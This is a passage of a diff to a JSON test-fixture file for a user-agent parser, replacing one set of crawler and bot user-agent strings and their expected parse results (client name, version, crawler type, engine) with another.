@@ -1,7 +1,7 @@
 [
   {
     "headers": {
-      "user-agent": "VergabefixBot/1.0 (+https://vergabefix.de/bot)"
+      "user-agent": "BDFetch"
     },
     "device": {
       "architecture": "",
@@ -23,7 +23,232 @@
       "bits": 0
     },
     "client": {
-      "name": "VergabefixBot",
+      "name": "BDFetch",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "FetchStream"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "FetchStream",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; ltbot/0.3.6 +https://www.tu-darmstadt.de/vorbeischauen/aktuell/nachrichten_1/tubahnkooperation.de.jsp)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Generic Bot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": "Presto",
+      "version": null,
+      "manufacturer": "opera"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "BoogleBot (booglebot.com; boogi@boogle.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "BoogleBot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "toquo.es/1.3.1 (+http://www.toquo.es/bot.php)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "toquo.es bot",
+      "modus": null,
+      "version": "1.3.1",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; EtaoSpider/1.0; http://open.etao.com/dev/EtaoSpider)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "EtaoSpider",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -46,7 +271,7 @@
   },
   {
     "headers": {
-      "user-agent": "what-vpn/0.7"
+      "user-agent": "Isara-Search/Isara-1.0 (A non-profit web crawler operated by a charity organization.; www.isara.org; webmaster@isara.org)"
     },
     "device": {
       "architecture": "",
@@ -68,52 +293,7 @@
       "bits": 0
     },
     "client": {
-      "name": "what-vpn",
-      "modus": null,
-      "version": "0.7.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; DomainHtmlReachabilityProbe/1.0) python-httpx"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "DomainHtmlReachabilityProbe",
+      "name": "Isara-Search",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -129,14 +309,14 @@
       "bits": 0
     },
     "engine": {
-      "name": null,
+      "name": "Presto",
       "version": null,
-      "manufacturer": "unknown"
+      "manufacturer": "opera"
     }
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; HooltyBot/1.0; +https://hoolty.com)"
+      "user-agent": "grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)"
     },
     "device": {
       "architecture": "",
@@ -158,9 +338,9 @@
       "bits": 0
     },
     "client": {
-      "name": "HooltyBot",
+      "name": "grub-client",
       "modus": null,
-      "version": "1.0.0",
+      "version": "1.5.3",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -181,7 +361,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; CompanyMatcher/1.0)"
+      "user-agent": "449 Overture-WebCrawler/3.8/Fresh (atw-crawler at fast dot no; http://fast.no/support/crawler.asp"
     },
     "device": {
       "architecture": "",
@@ -203,9 +383,9 @@
       "bits": 0
     },
     "client": {
-      "name": "CompanyMatcher",
+      "name": "Overture",
       "modus": null,
-      "version": "1.0.0",
+      "version": null,
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -226,7 +406,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; Akquiso/1.0)"
+      "user-agent": "Mozilla/5.0 (compatible; Ex-Crawler/0.1.5a; powered by ex-crawler; +http://www.ex-crawler.de/) Java/1.6.0_20,gzip(gfe),gzip(gfe)"
     },
     "device": {
       "architecture": "",
@@ -248,9 +428,54 @@
       "bits": 0
     },
     "client": {
-      "name": "Akquiso",
+      "name": "Ex-Crawler",
       "modus": null,
-      "version": "1.0.0",
+      "version": "0.1.5-alpha",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": "JavaOS",
+      "marketingName": "JavaOS",
+      "version": null,
+      "manufacturer": "sun",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "fastlwspider/1.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "WSP Bot",
+      "modus": null,
+      "version": null,
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -271,7 +496,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; QueritBot/1.0; +https://www.querit.ai/bot)"
+      "user-agent": "nyobot/1.1 (Noyb.com search engine crawler; http://www.noyb.com; bot@noyb.com),gzip(gfe),gzip(gfe)"
     },
     "device": {
       "architecture": "",
@@ -293,9 +518,9 @@
       "bits": 0
     },
     "client": {
-      "name": "QueritBot",
+      "name": "Yobot",
       "modus": null,
-      "version": "1.0.0",
+      "version": "1.1.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -316,7 +541,7 @@
   },
   {
     "headers": {
-      "user-agent": "LinkScanProcessor/1.0"
+      "user-agent": "Willow Internet Crawler by Twotrees V2.1"
     },
     "device": {
       "architecture": "",
@@ -338,502 +563,7 @@
       "bits": 0
     },
     "client": {
-      "name": "LinkScanProcessor",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": "Text",
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; Shap-User/0.1.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Shap-User",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": "WebKit",
-      "version": "537.36.0",
-      "manufacturer": "apple"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "internet2bot/0.1 (+mailto:bot@onvault.org)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "internet2bot",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; URLValidator/1.3)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "URLValidator",
-      "modus": null,
-      "version": "1.3.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "RankPulseBot/0.1 (+https://github.com/rankpulse/rankpulse)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "RankPulseBot",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; GeoSurge/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "GeoSurge",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; RecScan/2.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "RecScan",
-      "modus": null,
-      "version": "2.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "gwf-carbon-txt-crawler/1.0 (Web Crawler for the Green Software Foundation to measure the adoption of the carbon.txt initiative; https://carbontxt.org/; support@greenweb.org)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "gwf-carbon-txt-crawler",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "passive-shop-targets/2.0 (+security.txt and passive header triage)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "passive-shop-targets",
-      "modus": null,
-      "version": "2.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 ArtelLeadRadar/4.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ArtelLeadRadar",
-      "modus": null,
-      "version": "4.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; FinderGo/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "FinderGo",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; KenyaDomainScorer/2.1)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "KenyaDomainScorer",
+      "name": "Willow Internet Crawler",
       "modus": null,
       "version": "2.1.0",
       "manufacturer": "unknown",
@@ -856,7 +586,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; PhishBucketRust/1.0)"
+      "user-agent": "MSR-ISRCCrawler"
     },
     "device": {
       "architecture": "",
@@ -878,7 +608,97 @@
       "bits": 0
     },
     "client": {
-      "name": "PhishBucketRust",
+      "name": "CCrawl",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Nuzzel"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Nuzzel",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; Faveeo/1.0; +http://www.faveeo.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Faveeo",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -901,7 +721,7 @@
   },
   {
     "headers": {
-      "user-agent": "multi-country-domains/1.0"
+      "user-agent": "Ruby, Twurly v1.1 (http://twurly.org)"
     },
     "device": {
       "architecture": "",
@@ -923,9 +743,9 @@
       "bits": 0
     },
     "client": {
-      "name": "multi-country-domains",
+      "name": "Twurly",
       "modus": null,
-      "version": "1.0.0",
+      "version": "1.1.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -946,7 +766,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; platform-fingerprint/1.0)"
+      "user-agent": "datagnionbot (+http://www.datagnion.com/bot.html)"
     },
     "device": {
       "architecture": "",
@@ -968,9 +788,9 @@
       "bits": 0
     },
     "client": {
-      "name": "platform-fingerprint",
+      "name": "datagnionbot",
       "modus": null,
-      "version": "1.0.0",
+      "version": null,
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -991,7 +811,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; PostitLeadDiscovery/2.0; public business contact research)"
+      "user-agent": "Clickagy Intelligence Bot v2"
     },
     "device": {
       "architecture": "",
@@ -1013,7 +833,7 @@
       "bits": 0
     },
     "client": {
-      "name": "PostitLeadDiscovery",
+      "name": "Clickagy Intelligence Bot",
       "modus": null,
       "version": "2.0.0",
       "manufacturer": "unknown",
@@ -1036,7 +856,7 @@
   },
   {
     "headers": {
-      "user-agent": "LetrixLabs/1.0"
+      "user-agent": "Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)"
     },
     "device": {
       "architecture": "",
@@ -1058,412 +878,7 @@
       "bits": 0
     },
     "client": {
-      "name": "LetrixLabs",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; UdV-AI-Research/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "UdV-AI-Research",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "nsfw-go-placeholder-filter/1.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "nsfw-go-placeholder-filter",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "TrustBot/1.0 (+https://truster.info/bot)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "TrustBot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HUNT-Bot/0.1 (+https://github.com/hunt-discovery; discovery engine)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "HUNT-Bot",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 NextJSDetector/2.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "NextJSDetector",
-      "modus": null,
-      "version": "2.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "es-crawler/0.1"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "es-crawler",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; JoomlaDetector/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "JoomlaDetector",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "scrape_central/1.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
